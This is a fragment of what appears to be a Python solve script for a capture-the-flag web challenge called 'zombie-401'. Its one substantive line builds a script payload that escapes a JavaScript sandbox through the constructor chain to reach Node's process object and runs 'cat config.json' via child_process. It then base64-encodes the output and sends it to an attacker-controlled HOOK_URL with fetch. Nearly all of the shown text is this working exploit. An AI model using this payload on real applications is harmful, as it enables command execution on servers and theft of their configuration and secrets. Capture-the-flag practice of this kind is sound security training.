...
CHAL_URL = 'https://zombie-401-tlejfksioa-ul.a.run.app'
...
def solve():
    ...
    script = f"<script>let process = this.constructor.constructor('return process')();let data = process.mainModule.require('child_process').execSync('cat config.json').toString();fetch('{HOOK_URL}?data='+btoa(data))</script>"
